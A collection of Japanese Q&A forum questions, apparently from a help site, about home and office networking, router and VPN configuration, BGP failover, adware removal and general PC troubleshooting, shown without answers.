初めまして。 長い間社内のサーバを担当されていた方が急に辞めてしまい、 急遽、私が臨時の担当になりました。 弊社は小さなソフトハウスで、現在、お客様のサービスの開発を行っています。 サービス提供環境としてクラウドを使用することになったのですが、 ドメインについてはお客様のホームページのサブドメインを利用したいと 要望されました。 お客様のホームページはレンタルサーバで運用されており、 ドメインは別の会社で独自のものを取得したとのことでした。 当時の担当者がいないのでレンタルサーバ会社やドメインの会社は 調べないとわからないそうです。 調べるのに時間がかかるから、それまでにそちらでも調べてほしいと言われました。 それでクラウド提供会社に問い合わせをしたところ、 そのレンタルサーバがサブドメインの提供を許していれば、 そのサブドメインをクラウドに設定すれば、よいとのことでした。 DNSについては、ドメインを取得したときのDNSサービスに、サブドメインのレコードを 追加すればよいので、弊社は特に何もしなくてよいと言われました。 そこで質問ですが、 弊社のお客様がしなくてはいけない作業は、 ・ドメイン取得時に設定したDNSサーバにサブドメインの情報を登録 　このときのIPアドレスは弊社がクラウドの契約で取得すたグローバルIPアドレス 弊社がしなくてはいけない作業は、 ・クラウドにお客様より教えて頂いたサブドメインをドメインとして登録 であっていますでしょうか？ ドメイン、DNS関連の経験がある人間が周りにいないので、 本当に、弊社がDNS周りの設定をする必要がないのか不安で質問しました。 わかりにくいところもあるかと思いますが、よろしくお願いいたします。
ADSLモデムSV3を使用しています。 そのセキュリティログに以下の内容が出ていました。 受信時間 送信元IPアドレス／ポート 宛先IPアドレス／ポート プロトコル アクション 2013/02/25 19:18:24 192.168.1.252/- 61.x.y.z/- ICMP 廃棄[パケットフィルタ] 2013/02/25 19:18:24 192.168.1.252/- 61.x.y.z/- ICMP 廃棄[パケットフィルタ] 2013/02/25 19:18:24 192.168.1.252/- 61.x.y.z/- ICMP 廃棄[パケットフィルタ] 実際は、一秒間に10件から20件くらいです。 宛先IPアドレスの61.x.y.zはルーターに割り当てられたグローバルIPです。 通常、送信元IPには相手先として、グローバルIPになると思うのですが、 何故か、ご覧のようにプライベートIPです。 パケットフィルタ設定には「プライベートアドレスを使用した外部装置との通信を禁止」項目があるので、これで廃棄されていると思います。 この送信元IPには心あたりがありません。 DHCPで振り出す範囲からも外れていますし、固定IPでも使用していません。 １．これは何が起きているのでしょうか？ ２．秒間20件というアクセスは通常レベルでしょうか？ ３．止めることはできますか？ どうぞ、宜しくお願いします。
初心者でもうしわけございませんがYAMAHA RTX1100の設定を頼まれてしまい 四苦八苦しておりますので御教授ください。 現在　 LAN１にIP　192.168.10.1　 LAN2に　PPPOE LAN3にIP　192.168.20.1 LAN3にLAN1のクライアントから使用するWEBサーバーIP　192.168.20.10　を置いてある状態で LAN1からLAN3のWEBサーバーへはアクセスできる状態にあります。 また現在はLAN3からLAN1へもアクセスができる状態です。 そこでフィルタの設定なんですが LAN1からLAN3へはアクセス許可にしておいて LAN3からLAN1へはアクセス遮断とする場合 どういったフィルタ設定にすればよろしいでしょうかご教授よろしくお願いいたします。
まとめサイトで自分と同じ症状の人を見つけたのですが、2chネラーの方々は「情弱」とか、「ウイルスだよ」などなどの反応だったのですが、自分もxvideosを再生したときに、同じように別窓で謎曲が流れる広告が表示されます。 これって本当にウイルスなんですか？ 表示できないようにすることって可能なんですかね？ ウイルスセキュリティソフトはウイルスセキュリティzeroを使ってます。osはVistaです。 毎日ウイルスセキュリティソフトでウイルス検査していたので、安心していたのですが、不安です。
質問させて頂きます。 ある単語(例えば、akb48)に関連する単語を集めて、ある単語に関連する単語のネットワークを作りたいと思います。google検索などの検索サイトでの予測検索ででてきた単語(akb48 総選挙:　この場合'総選挙'が関連単語)を集めて調べようと思うのですが、そのように予測変換で出力される文字を抽出することはできるのでしょうか？検索バー上でのみの表示なのでHTMLにも表示されていないのでどうすればいいかやり方が分かりません。 もしご存知の方がいらっしゃれば御教示願います。もしくは他の良い方法を教えて頂けると幸いです。また、私はperlやUNIXなどのプログラミングを少し行うことができます。 それではよろしくお願い致します。
この教えてgooでもそうなんですが、例えば質問をしようとする時にタイトルの空欄をクリックしたら過去に質問入力したタイトルの一覧が出てきてしまいます。そうならないようにするにはどうすればよろしいでしょうか。ちなみにGoogle Chromeを使ってます。どなたかよろしくお願いします。
閲覧ありがとうございます 一昨日、いきなりネットに繋がらなくなってしまい、一晩おいたらネットに繋がりました。 普段のようにニコニコ生放送を観ようとすると、永遠に　読み込み中・・・　と出ます。(他のPCも同じ） 全てのオンラインゲームが出来ません。「現在、サーバーの問題で接続出来ません」と出ます。 TwitterやYoutube、ニコニコ動画（生放送のみ×）などは快適にできるんです。 試しにVPNを使ってアメリカサーバーにしてニコニコ生放送を見てみるとみれました。 ちなみに回線は、バッファローの無線LANルーターの型番wzr-hp-ag300hを使っています。 (http://buffalo.jp/products/catalog/network/wzr-h …) これは何の問題でしょうか？ 色々ネットで調べたのですが、難しすぎて自分にはわかりませんでしたorz 原因と直し方を教えてください。お願いします。
つい最近パソコンを入れ替えました。 ネットワークで外付けハードを使用しています。 パソコン設定時からネットワークで外付けハードが見えませんでした。 私よりもパソコンに詳しい人に設定してもらった時に、外付けハードへのアイコンを デスクトップに出してもらっていたので、そこからは、ハードの中が見れます。 （当初設定してしてくれた人もネットワークで見れないことは解決できませんでした） それで、外付けハードの中の一太郎以外のファイルは開けますし、編集もできます。 一太郎だけがファイルを開くことができません。 ファイルをコピーしてデスクトップに持ってくれば編集できます。 どなたか、対処方法をご指導願います。 よろしくお願いします。
ホームページが勝手に http://jp.hao123.com/?tn=bbl_hp_hao123_jp&babsrc … というサイトに書き換えられます。 何かのウイルスでしょうか? どうすれば元に戻るのでしょうか?
お世話になります。 現状、社内のドメインに参加しない ワークグループ（設備系：Windows98）に 社内ＮＷのドメインに参加しているＰＣ（ホスト：WindowsXP）で 作成したテキストファイルを ＦＤで持ち運んでいるのですが 不便なのでファイル転送をできないかと思ってます。 こういった場合どのようなネットワークにすれば良いでしょうか？ （設備のワークグループを社内ドメインに入れずに実現したいのですが） ワークグループにハブを設置し、社内ネットワークからＬＡＮをつなぎ 指定するＰＣの共有フォルダへファイル転送のコマンドなどを 使えばできるのかなと思うのですが・・・ 何か良い方法はないでしょうか？ よろしくお願い致します。
メールに添付されたファイルの種類application/http-index-formatはどのように開くのでしょうか？ ファイルの場所としてhttp://数字とあります。 adobe readerの最新をダウンロードしましたがダメでした。 よろしくお願いします。
閲覧ありがとうございます 昨日、突然オンラインゲーム全てができなくなりました。 インターネット自体はできます。ゲームだけが出来ません。 使っているのは　バッファローの無線LAN子機　型番はWZR-300HPです。 色々調べたところポートを開放すればできる、とのことですが わたしはあまりパソコンに詳しくないので ポート開放の方法を簡単に教えてくれませんか？ 他に、ゲームができない原因があれば教えてください！
お世話になります ルーターについてほとんど無知なので調べましたが解決できず気になっております。 タイトル通りなんですが、 ルータの再起動が必要なときってどんな時でしょうか サポート業務内で、ルーターの再起動でシステムが復帰することがありますが 「あ、これはルータが怪しいな」となるための判断材料は何があるんでしょうか 宜しくお願いします
ひとつのレンタルサーバーに複数のホームページをつくり運営しているのですが、ドメインにアクセスされるとサーバーのなかが丸見えになってしまうのを防ぐにはどうしたらよいでしょうか？ サーバーはさくらインターネットをつかい、FTPはFFFTPを使用しています。 http://○○○.sakura.ne.jp/日記/index.html http://○○○.sakura.ne.jp/掲示板/index.html このように、日記と掲示板という2つのサイトを運営していた場合（相互リンクはされてません） http://○○○.sakura.ne.jp このURLにアクセスされると、日記と掲示板というサイトを運営していることがバレてしまいます。 PHPなどで作ったページがある場合、ソースが盗まれてしまうこともあります。どうしたら、このページを隠すことができるでしょうか？
複合機の開発に携わっております。 SNMPエージェントの開発を初めて行うのですが、 TRAPの設定方法（使用方法）が分からなく質問いたします。 TRAPの発生条件（設定）はエージェント側で設定するものなのか、 マネージャー側からエージェント側に対しTRAP発生条件要求して使うものなのか 一般的にどのうような手段で設定するものなのか教えてください。 特定のOIDの変化を設定したりするのはエージェントで行うのかマネージャー側で行うものか ネット等で調べたのですが、一般的な設定手段がよく分からないです。 SetRequestメッセージで設定するとも書籍にありました。 何方かご経験ある方がいれば、是非ご教示下さい。
クッキーには、ブラウズに使っているOSが何であるかなどブラウズしているパソコンの情報がたくさん記録されていて、その情報を用いてWebサイトはパソコンを識別していると教えていただきました。 クッキーにはどのようなパソコン情報が記録されているのでしょうか。できるだけたくさん教えていただけませんか。
MacOSXでサーバーを構築していますが、そのサーバーを踏み台にして別のマシンに接続する必要があり、ApacheのReverseProxyを設定しました。 設定自体はうまく行ったのですが、その後、プロクシリストに登録されたらしくアクセスが集中して非常に重くなりました。 プロクシ自体は機能していないので、セキュリティ的にはおそらく問題ないと思うのですが、とにかくアクセスが多く、やむなくApacheを停止しました。 質問なのですが、ReverseProxyを設定するだけでプロクシサーバーとしてボット？に見つけられるものなのでしょうか。 設定でどうにかなるのであれば、プロクシサーバーとしてヒットされないReverseProxyの設定方法を教えていただければと思います。 Apacheのバージョンは2.2.22 MacOSは10.6.8です。
この度、Ｆａｃｅｂｏｏｋのアカウント登録を完了しましたが、友人を探すなどに必要な検索窓が表示されません。如何したものでしょうか？ 検索窓は、言葉で表現すれば「Facebookの右に文字等を入力する空欄の窓枠で、その右に検索ポインタ－がある」というものです。
最近、内側からサーバに対してポートスキャンを行っている端末があるみたい。調べてみるとそう送信元を頻繋に変更しているようです。まだ被害がないですが、相手と原因を特定したい。行うべきな作業をおしえてください。初心者なので、よろしくお願いします。
内のシステムから外部に対して通信可能なサーバを設定しています。外部のコンピュータにログインしたいですが、接続許可リストに含まれていないんです。行うべきな作業を教えてください。 初心者なので、よろしくお願いします
よろしくお願いします。 良くビジネスホテルに宿泊すると、 「インターネット接続無料」などが多いですよね。 以前は部屋の机に、LANケーブルがニュッと出ていました。 最近はWifiもあるのでしょうか。 ・・・ 持ち込んだノートPCをそれらに接続して、ブラウザを起動すると、 そのホテルのWebページのログイン画面が表示されることは無いでしょうか？。 以前に、そこでフロントから渡されたIDとパスワードを入力し認証すると、 インターネットに接続することができたのです。 この仕組みを知りたいのですが、これは「VPNを使うための認証」をしているのでしょうか？。 仕組みがわからず、気になったもので、 ご存知の方がいらしたら是非教えて頂ければ幸いです。
こちらにTorの説明があり、その中の概要の項に「ホップ」という言葉があります。 http://ja.wikipedia.org/wiki/Tor 「ホップ」って何ですか。 それと、「ホップ」という用語の意味を説明したWebサイトがもしあれば、それもお教えいただけませんか。
L2TP/IPSecのルータのポート開放なんですが ルータのポートフォワーディングで 1701 (udp) ・・・・l2tp 4500 (udp)・・・・ipsec-nat-t 500 (udp)・・・isakmp の３つを宅内サーバに向けて開放していますが、つながりません。 ポート開放の番号や数が違うんでしょうか？ 同じようにサーバ側のパケットフィルタリングでも上記３つを開放しています。
誤認逮捕事件でTorというアプリケーションが話題になっていますが、このアプリケーションを、現時点で、解発、管理している組織は何でしょうか。 また、そのことを示すWebサイトがあるでしょうか。
PHPで書かれた「アクセス解析」コードを見ているのですが、IPアドレス部分に関して内容が理解できせん。何をしようとしている(と予想できる)か、教えて下さい ■前提 ・IPアドレスの一番下の桁を0にして保存しています ・「123.45.678.93」→「123.45.678.0」 ・「220.30.220.912」→「220.30.220.0」 ■質問1 ・ホスト部を0にしているので、「IPネットワークアドレス」を保存している、という理解で合っているでしょうか？ ・算出方法。ビット(「IPアドレス」✕「サブネットマスク」) … long2ip( ip2long( $_addr ) & ip2long( $_mask ) ); ■質問2 ・またこの際、算出結果が、'0.0.0.0'だったら空を返す、という条件が入っているのですが、ビット(「IPアドレス」✕「サブネットマスク」) は、'0.0.0.0'になったりするのでしょうか？ ■質問3 ・IPネットワークアドレス自体、よく分からないのですが、例えば、「192.168.1.0」＝「192.168.1.XXX ネットワークそのもの」、と言う理解で合っているでしょうか？ ・つまり、アクセス解析時に、「192.168.1.0」を登録することは、「192.168.1.1」「192.168.1.2」も全て同じアクセスとみなす、ということを意味するのでしょうか？ ■質問4 ・「IPアドレス」と、「IPネットワークアドレス」って、何が違うのでしょうか？ ・例えば、同じ「192.168.1.2」でも、所属する「IPネットワークアドレス」によって、異なる対象を指す、ということなのでしょうか？ ・それは、「サブネットマスク」を見なければ分からない、ということなのでしょうか？ ・もし、そうだとすると、所属が違うだけで、同じ「IPアドレス」はたくさん存在するのでしょうか？
一般的な家庭で出来るセキュリティー対策として、IPアドレスを時々変えることに意味はありますか？ また、変える頻度はどの程度が適切でしょうか？
遠隔操作ウイルス事件で容疑者が逮捕されましたが、容疑者の勤務先のパソコンから事件の舞台となったレンタル掲示板にアクセスした形跡が残っていると報道されています。 このような形跡はパソコンのどこに残るのでしょうか。また、どのくらいの期間残るのでしょうか。容疑者がそんな重要なものを何カ月も残しておくはずがないと思うのですが。
遠隔操作ウイルス事件で代行スレッドというのが有名になりましたが、代行スレッドって何でしょうか。
　エルソードをプレイしようと、GAMESTARTを押して 1分くらい経つと 毎回「ファイアウォールの更新に失敗しました」と出て、何度やってもそうなります。 　ちなみに知恵袋で検索して見つけた答えは セキュリティソフトが関係あったり、ファイアウォールの例外設定をしなければいけないみたいで、ファイアウォールの例外設定はエルソードのexe系のものを全てやりました。 　やってみたのはファイアウォールだけなのですが、残りのセキュリティソフトのやつは どうしたらいいでしょうか？それか、どうやったら普通に起動できるでしょうか？ 　あと、OSは7です
ZIPファイルで、鍵付きのものが安全であるかのよう言われていますが、 次のような不安があります。 １．鍵のデータはZIPファイルの中にある。 ２．鍵付きのZIPファイルを作成するソフトを、逆アセンブラすれば、鍵がどこに、どのように変換されて保存されているかが分かる。入力された鍵との比較方法もわかる。 ３．よって、ZIPファイルをバイナリファイルとして解析すれば鍵が分かる。 ４．解読されてしまう。 このような不安があるのですが、 そもそも、鍵のデータはZIPファイルの中に存在するかどうかも勉強不足で分かりません。 安全性の根拠を説明してあるHPなどありましたら 教えていただきたいと思います。 よろしくお願いします。
Ubuntu12にPHP用の開発環境を構築しているのですが、phpMyAdmin(Webブラウザ上でDB操作するツール)のログインページを開くのに１分程待たされてしまい困っています。 TOPコマンドで調べたところCPUやメモリの問題では無さそうなのですが、 以下の記事(↓)のNo4さんの回答のように http://q.hatena.ne.jp/1161056201 arp -a を実行するとしばらく応答が無く、 arp -anを実行したところ、 arp -an ? (192.168.1.1) at <不完全> on eth1 ? (10.0.2.2) at xx:xx:xx:xx:xx:xx [ether] on eth0 ? (192.168.56.1) at xx:xx:xx:xx:xx:xx [ether] on eth1 という結果が来たので、何やら「 (192.168.1.1) at <不完全>」の部分が怪しいようだ、という所までは理解できました。 これを解決するにはどうすれば良いのでしょうか？ とりあえずhostsに以下のように追記し、networkを再起動してみましたが、状況は変わりませんでした。 有識者の方いらっしゃいましたら、ご教授よろしくお願いします。 hosts----- 127.0.0.1 localhost 127.0.1.1 fujii-VirtualBox 192.168.1.1 inetgw # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters
拠点A　と　拠点BをインターネットVPNで繋ぐことになりました。(新規拠点は拠点B) 【構成図】 拠点B・・・Linuxルータ・・・Ciscoルータ・・・VPN・・・Ciscoルータ・・・Linuxルータ・・・拠点A 　　　　　　　　　　　　　　　　＼　　　　　　　　　　　　　　　／ 　　　　　　　　　　　　　　　　　　＼　　　　　　　　　　　　／ 　　　　　　　　　　　　　　　　　　　　　　インターネット インターネットVPNで拠点同士を接続する時は、 「拠点Bから送信される「CIFSデータ(ファイルサーバデータ)」は、拠点AにVPN通信で送信。」 「拠点Bから送信される「httpデータ」は、インターネットに送信。」 【質問】 というように設定するのが普通なのでしょうか？ むしろそのような設定がVPNで出来るのでしょうか？ 特に拠点Bからのインターネット通信を、 拠点Aのsquid等のプロキシサーバに通すといった設定条件はありません。 ファイル通信や必要データ以外は、VPN以外を通して通信させたいと思っています。 ご教授お願いします。
システム再構築中に「DELTA SEACH」ページが勝手に組み込まれ、通常のセキュリティチェックだけで無く、キーワード「DELTA」でファイル検索とレジストリエディタから「Unlocker」を併用した手動削除を試み、9割方削除に成功するも（IE,Google,Operaは完全削除成功の模様）、FireFoxで新しいタブを開いた時だけは未だに「DELTA　SEARCH」が表示される為、一時ファイルを手当たり次第削除してもまだ改善されず「アドオンのどれかが原因か？」疑い、「アドオンの全解除」を試した結果、FireFox自体が起動直後から殆ど動かなくなり、削除・再インストールを試しても改善されず困っております。 これ迄、「SweetIM」「YONTOO」「BABYLON」の削除は同様の方法で成功したのですが、 「DELTA」はWindows側のファイル名にも使われているらしく、識別が困難です。 ダウンロードの頻度が高い分、自動スキャンしてくれる為、使用頻度最高のブラウザが使用不能となり困っております 対処法をお教え頂ければ幸いです。宜しく御願い致します。
Catalyst2950を2台接続しています。クロスケーブルを２本使用。 （spanning-treeの動きをみるために学習中です。） VLAN１にIPアドレスはふってあります。 PCとSWの疎通確認はとれますが、SWとSWの疎通確認はとれません。 ポートランプは消灯したままです。 ここで １台のSWをreloadすると、ポートランプが２台ともに点灯します。 40秒後くらいに2台とも消灯してしまいます。 起動している間 show spanning-treeを実施してみたところ 正常に動いていることが確認できるのですが・・・ 40秒後くらいのところで ｌearning状態までは確認できました。 そのあと、急に落ちてしまう感じです。 この挙動は何なのでしょう？
人からIBMのノートパソコンを貰ったんですが開く時のパスワードがわからなくて開けません。 格パソコンによって押すボタンが違うみたいですが、電源入れてすぐF12とかF2とか押したら工場出荷時の状態に戻せるボタンがあると聞いたんですがわかる方教えてください。もちろん違うやり方が有るなら違うやり方でもいいです。とにかく開き方のわかる方お願いします。　ちなみに指紋認証のついたタイプです。
ネットワークの勉強をしているのですが、超初心者なので馬鹿な質問をするのを許してください。 IPアドレスにネットワーク部とホスト部があることを本で読んだのですが、これはプライベートIPの時だけの考え方ですか？ グローバルIPにもこの考えが応用できるのでしょうか？ できるとしたらグローバルIPアドレスのネットワーク部ってどのようなものなのでしょうか？ プライベートIPのネットワーク部は部署ごとに分けるとかに使うのはなんとなくわかるのですが・・ 質問の仕方が下手ですみません。 初心者の馬鹿な質問です。 ご回答お待ちしています。
教えてください。 Outolookのメールを誤ってＡ氏に送信してしまいました。リコールをかけ、Ａ氏には削除してもらいましたが、Ａ氏はＢ氏を自動転送設定していたみたいなんです。。リコールで消しても、Ｂ氏にはメールを見られてしまいますか？？ パソコンに関して無知なので、教えて頂けたらうれしいです。。。
teratermでwebサーバーにSSH接続で更新をしたいのですが、 ホストに接続できませんというエラーが返ってきて接続できません。 どなたかお力を貸してください。
FBの二重登録
DSのソフトで、そのソフトがwep接続しか対応しておらず、USB無線LANを購入して渋々wepにしてパスを付けてゲームをやっていたのですが、最近私がUSB無線LANを使っていると勝手にソフトが起動している様な感じで、その頃から妹も何かパソコンが変と言い出しました。 （家に一台のPCを妹と共同で使っていて、親はインターネットに興味がなく触った事がありません） 妹はwepのパスが解除されているんではないかと言っていて、その理由を聞くと妹がUSB無線LANを挿した少し後ぐらいに、隣の家から繋がったと声が聞こえたらしく、試しにUSB無線LANを引っこ抜いたら、切れた、という男の声が聞こえたからだそうです。 もしそれが無線LANの件で切れたと言った訳でなくとも、不安な状態でインターネットをやりたくないと妹と同意見だったので、ウイルスチェックをして外付けHDDに大事なデータを移し、ヤフーのパス等を変更しPCを初期化しようという事になったのですが、妹は回線（NTTプレミアム）とプロパイダーもIDとパスを変えた方がいいんじゃないか？と言っているのですが、そうなるとレンタルしているモデムとルーター（無線LAN機能なし）も交換した方がいいんでしょうか？ 聞きたい事を簡素に纏めると (1)モデムとルーターは交換する必要はなく、回線とプロパイダーのIDとパスだけ変えるだけで大丈夫なんでしょうか？ (2)この上記に書いた事ぐらいで大丈夫でしょうか？色々調べたのですが、もし他にやっていた方がいい事があれば教えて下さい。
回線切り替え時に影響がないかどうか、という事についてのご質問です。 結構長い文章になってしまい申し訳ないですが、宜しくお願いいします。 ある2拠点間を広域イーサの回線を使用し接続しています。その拠点間を接続するのに、 主回線と副回線の2回線があり、それぞれ別のISP業者の広域イーサを使用しています。 ２拠点ともメイン、バックアップのAS境界ルータが2台ずつ設置してあり、ルーティング プロトコルはebgpとしてBGP、ibgpとしてOSPFが動作しています。 今回、回線工事に伴い、一時的に主回線と副回線を切り替える事になりました。 元々片側の拠点でのみBGPパスアトリビュートの設定していた事により、その片側拠点でのみ MEDとLPの値を変更し、回線を切り替える事になったのですが、 その際瞬断は発生しないか心配しております。大丈夫でしょうか？ 調査したところ、MEDとLPの変更するコマンドを実行する際に、一度BGPセッションをリセット しなければ変更した値に更新されないような感じでしたが、一度コマンドにてBGPセッションを 切断する必要があるのでしょうか？ それとも、値を変更するコマンドを実行した時点で、BGPセッションは切れるのでしょうか？ 優先度が高いパスアトリビュート(例えばLPとか)は、コマンド実行と同時にBGPセッションが 切れるというような事を聞いた事がありますが、本当でしょうか？ 私も素人なりに調べたところ、変更時にソフトリセットするコマンドも一緒に実行すると、 BGPセッションが切れず、値が変更されるようなので、瞬断もないのかな？とは思いましたが、 回線が切り替わるタイミングがどのタイミングか分かりませんし、その時のルータの 状態(CPUの使用率等)によって、最悪、瞬断が発生してしまうのでは。。とも思いました。 今回、瞬断が発生しては困るので、そうならない方法、や、逆に瞬断が発生してしまう事例等を ご存知でしたら、教えて頂けないでしょうか？ あと、拠点内では、OSPFが動作していますが、BGP⇔OSFPでの再配送は行っておりません。 AS境界ルータのメインルータとバックアップルータ間は、HSRPで冗長構成を組んでいますが、 BGPの経路情報はOSPFルータに広報される事はありませんので、OSPFの経路としては、 BGPの回線が副回線に切りかわっても、AS境界ルータのメインルータ(OSPFのActiveルータ) の方に向けて通信を行うと思うので、特に通信断などは発生しないと考えているのですが、 大丈夫でしょうか？ BGPの経路切り替わり時にOSPFの通信に影響はないでしょうか？ 分かり辛くですみません。 なにかご存知の情報がありましたら、教えて頂けないでしょうか？ 2～3日後に、お客さんに通信影響についての説明をしなければいけないのですが、 訳が分からず困っています。 ちなみにかなり急いでいるので、至急回答をお待ちしております。 宜しくお願いたします。
ブロードバンドルーターとサーバマシンがあります。 ブロードバンドルータ(192.168.1.1) | | |eth1(192.168.1.253) サーバ(linux or Windows)eth2(192.168.2.254)----192.168.2.0/24NW |eth0(192.168.3.254) | 192.168.1.0/24NW という構成の時、サーバインストール時にて各インターフェースにて以下設定をしております。 <eth0> IP：192.168.3.254/24 デフォルトゲートウェイ：192.168.1.1 DNS：192.168.1.1 <eth1> IP：192.168.1.253/24 デフォルトゲートウェイ：192.168.1.1 DNS：192.168.1.1 <eth2> IP：192.168.2.254/24 デフォルトゲートウェイ：192.168.1.1 DNS：192.168.1.1 ・質問1：eth0,1,2にデフォルトゲートウェイとDNSを設定する必要性 eth0,1,2のデフォルトゲートウェイアドレスとDNSアドレスを ブロードバンドルータに設定しているのですが 3つのインターフェースすべてに設定が必要な物なのでしょうか？ ・質問2：eth0,2デフォルトゲートウェイの設定内容 eth0とeth2のデフォルトゲートウェイは、192.168.1.1のブロードバンドルータに設定していますが eth1の192.168.1.253に設定した方がいいのでしょうか？ ご教授お願いします。
最近買ったばかりのPC（Windows8）なのですが、リカバリーしたらネットに接続できなくなってしまいました。 購入した当時は自動的にワイヤレスの接続先が出てきて設定できたのですが、リカバリーした現在は、「利用できる接続はありません」と出てきてしまいます。 （リカバリーする直前までインターネットは繋がっていました。） PC設定のワイヤレスのところにある、ワイヤレスデバイスはオンになっています。 右側にあるメニューバーを出すと、ネットのアイコンは利用不可に、デスクトップの右下のアイコンも×で未接続になっています。 リカバリーしたのがまずかったでしょうか。 何かインストールしないといけないのでしょうか。 PC初心者でよくわからず・・・、宜しくお願いします。 使用しているPCはこちらです↓ http://www.dospara.co.jp/5shopping/detail_prime. …
最近、ソフトバンクのモデムに 変えたのですが、 ルーターを繋いでも ネットワークに接続できません。 一回、モデムを交換して もらったのでモデムの故障では ないと思います。 今まではＮＥＣのモデムを 使っていましたが、ルーターは 正常に機能していました。 ルーターの故障でもありません。 繋ぎかたに問題もありません。 とても困っています。
お世話になります rtx1100を使用してVPNを構築しようとしており接続はpptpとip-secの両方を考えております 環境としましては以下のようになっております 動的IP（DDNS使用/PPPoE） 　｜ （lan2) rtx1100 (lan1 - 192.168.1.1/24) 　｜ 社内LAN - 192.168.1.10-30/24 VPNクライアント 192.168.1.50-55 色々なサイトを参考にさせて頂き一通り作業が終わりましたので外部からテスト接続をしたのですが VPN自体ip-secでは弾かれてしまいましたがpptpでは接続が出来ました その際、vpnクライアントはipアドレスは指定範囲でもらえていましたが サブネットは社内ＬＡＮと同じ255.255.255.0ではなく255.255.255.255でした ただ、pptpで接続されてもrtx1100まではpingもロスなしで繋がっているのですが 社内ＬＡＮへのアクセスが不安定であり ＶＰＮクライアントのwindowsからのpingも全部ロスだったり、全部返ってきたり 1回だけ返ってきたりとまったく安定しません 無事社内ＬＡＮの共有フォルダにアクセスできていても不安定だからなのか 通信速度も遅く、ファイルを開いたりするのに時間がかかってしまいます 色々試してもみたのですが、全くわからず困り果ててしまいました お手数とは思いますが、ぜひご教授お願い致します また、以下に現状の問題点や当方がはまってしまっている内容も記載致します ・pptpが不安定（通信速度も遅い） ・ip-secが繋がらない ・vpnクライアントのサブネッが255.255.255.0ではなく255.255.255.255になってしまっている ・wan側のpingに反応しないようにしたい ・wan側の全ポートをステルスにしたい ・pptpのポートは動的フィルタで動作するのか？ login password * administrator password * login user user * timezone +09:00 console prompt [RTX] login timer 1800 ip route default gateway pp 1 ip filter source-route on ip filter directed-broadcast on ip lan1 address 192.168.1.1/24 ip lan1 proxyarp on pp select 1 pppoe use lan2 pppoe auto connect on pppoe auto disconnect off pp auth accept pap chap pp auth myname user pass ppp lcp mru on 1454 ppp ipcp ipaddress on ppp ipcp msext on ppp ccp type none ip pp mtu 1454 ip pp nat descriptor 1 pp enable 1 pp enable 2 pp select anonymous pp bind tunnel1-tunnel4 pp auth request mschap-v2 pp auth username user1 pass1 pp auth username user1 pass1 ppp ipcp ipaddress on ppp ipcp msext on ppp ccp type mppe-any ip pp remote address pool 192.168.1.50-192.168.1.55 ip pp mtu 1258 pptp service type server pp enable anonymous tunnel select 1 tunnel encapsulation l2tp ipsec tunnel 101 ipsec sa policy 101 1 esp aes-cbc sha-hmac ipsec ike keepalive use 1 off ipsec ike local address 1 192.168.1.1 ipsec ike nat-traversal 1 on ipsec ike pre-shared-key 1 text string ipsec ike remote address 1 any l2tp tunnel disconnect time off l2tp keepalive use on 10 3 l2tp keepalive log on l2tp syslog on ip tunnel tcp mss limit auto tunnel enable 1 tunnel select 2 tunnel encapsulation l2tp ipsec tunnel 102 ipsec sa policy 102 2 esp aes-cbc sha-hmac ipsec ike keepalive use 2 off ipsec ike local address 2 192.168.1.1 ipsec ike nat-traversal 2 on ipsec ike pre-shared-key 2 text string ipsec ike remote address 2 any l2tp tunnel disconnect time off l2tp keepalive use on 10 3 l2tp keepalive log on l2tp syslog on ip tunnel tcp mss limit auto tunnel enable 2 tunnel select 3 tunnel encapsulation pptp pptp tunnel disconnect time off pptp keepalive use on ip tunnel tcp mss limit auto tunnel enable 3 tunnel select 4 tunnel encapsulation pptp pptp tunnel disconnect time off pptp keepalive use on ip tunnel tcp mss limit auto tunnel enable 4 ip filter 1 pass * 192.168.1.1 gre * * ip filter 2 pass * 192.168.1.1 tcp * 1723 ip filter 3 pass * 192.168.1.1 esp * * ip filter 4 pass * 192.168.1.1 udp * 500 ip filter 5 pass * 192.168.1.1 udp * 1701 ip filter 6 pass * 192.168.1.1 udp * 4500 ip filter 8 reject * * icmp-info * * nat descriptor type 1 masquerade nat descriptor address outer 1 ipcp nat descriptor address inner 1 auto nat descriptor masquerade static 1 3 192.168.1.1 esp nat descriptor masquerade static 1 4 192.168.1.1 udp 500 nat descriptor masquerade static 1 5 192.168.1.1 udp 4500 nat descriptor masquerade static 1 6 192.168.1.1 gre nat descriptor masquerade static 1 7 192.168.1.1 tcp 1723 ipsec auto refresh on ipsec transport 1 101 udp 1701 ipsec transport 2 102 udp 1701 syslog host 192.168.1.10 syslog notice on syslog debug on tftp host none telnetd service off dhcp service server dhcp scope 1 192.168.1.10-192.168.1.30/24 dns server pp 1 dns private address spoof on pptp service on l2tp service on httpd host 192.168.1.1-192.168.1.254 sshd service on sshd host 192.168.1.1-192.168.1.254 sshd host key generate *
access.logで xxx.xxx.xxx.xxx - - [01/Feb/2013:18:xx:xx +0900] "GET /imgs/xx/xx.gif HTTP/1.1" 200 346 上記のアクセスがたくさん来ているのですが、本当にユーザーのアクセスなのか疑わしく、 ツールなどでGETしているのではと思っています。 識別する方法は何かございますでしょうか。 ご存知の方、宜しくお願いします。
Catalyst2950　2台をもちいてspanning-tree の動作の確認を 勉強しようとしているのですが コマンドで show spanning-tree を実施したところ no spanning tree instance exists というメッセージが表示されます。 この意味をネットで検索してもあまりヒットせず よくわからない状態です。 どういうメッセージなのでしょうか？
PC(acer TravelMate5344シリーズ）に突然、 HDDセキュリティロックがかかりました。 BIOSにもはいれずパスワードも当然わかりません。 ディスク起動になっていないため、レスキュー用のプログラムも ためすことができません。 どうやったらBIOSにアクセスできますでしょうか？
ネットワーク内にIPアドレスが競合しているパソコンがある可能性があるので、見つけたいと思っています。 LAN内の機器はすべてDHCPサーバからIPアドレスを取得するはずなのですが、パソコンがIPアドレスの競合を検知し、DHCPサーバにDECLINEメッセージを返してしまうことがあります。 対象のネットワークが遠隔地であり、監視に使えるような機器も存在しません。 そのため現地のユーザのパソコンにパケットキャプチャなどのツールをインストールし、DHCP関連のパケットをキャプチャして調査したいと考えています。 競合がいつ発生するかわからず、かつパソコンは現地でユーザ業務に使用しているため IPアドレスの取得時に自動でパケットキャプチャをバックグラウンド起動してキャプチャしたいと考えているのですが、有効なツールや方法はありますでしょうか？
